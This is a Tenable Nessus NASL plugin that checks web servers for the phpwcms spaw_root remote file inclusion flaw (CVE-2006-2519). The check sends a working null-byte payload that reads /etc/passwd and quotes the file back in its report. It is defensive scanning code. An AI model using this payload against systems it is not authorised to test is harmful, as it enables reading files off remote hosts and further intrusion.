#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(21582);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2006-2519");
  script_bugtraq_id(18062);
  script_xref(name:"OSVDB", value:"25755");

  script_name(english:"phpwcms spaw_control.class.php spaw_root Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file using phpwcms");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to remote file inclusion attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running phpwcms, an open-source content management
system written in PHP. 

The version of phpwcms installed on the remote host fails to sanitize
user-supplied input to the 'spaw_root' parameter before using it in
PHP include() functions in the
'include/inc_ext/spaw/spaw_control.class.php' script.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit this flaw to view arbitrary files on the remote
host or to execute arbitrary PHP code, possibly taken from third-party
hosts." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/434706/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:N/I:P/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/phpwcms", "/cms", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit one of the flaws to read a file.
  file = "/etc/passwd%00";
  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/include/inc_ext/spaw/spaw_control.class.php?",
      "spaw_root=", file ));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream".
    egrep(pattern:"main\(/etc/passwd\\0config/spaw_control\.config\.php.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      report = string(
        "\n",
        "Here are the repeated contents of the file '/etc/passwd'\n",
        "that Nessus was able to read from the remote host :\n",
        "\n",
        res
      );
      security_note(port:port, extra:report);
    }
    else security_note(port);

    exit(0);
  }
}
